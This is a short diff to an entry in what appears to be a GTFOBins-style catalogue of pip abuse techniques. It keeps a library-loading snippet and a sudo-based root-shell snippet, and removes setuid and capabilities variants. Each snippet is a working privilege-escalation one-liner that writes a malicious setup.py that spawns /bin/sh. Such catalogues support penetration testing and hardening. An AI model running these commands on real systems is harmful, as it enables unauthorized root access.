@@ -66,19 +66,9 @@ functions:
         TF=$(mktemp -d)
         echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
         pip install $TF
-  suid-enabled:
-    - code: |
-        TF=$(mktemp -d)
-        echo "import os; os.execl('/bin/sh', 'sh', '-p', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
-        ./pip install $TF
   sudo-enabled:
     - code: |
         TF=$(mktemp -d)
         echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
         sudo pip install $TF
-  capabilities-enabled:
-    - code: |
-        TF=$(mktemp -d)
-        echo "import os; os.setuid(0); os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
-        ./pip install $TF
 ---
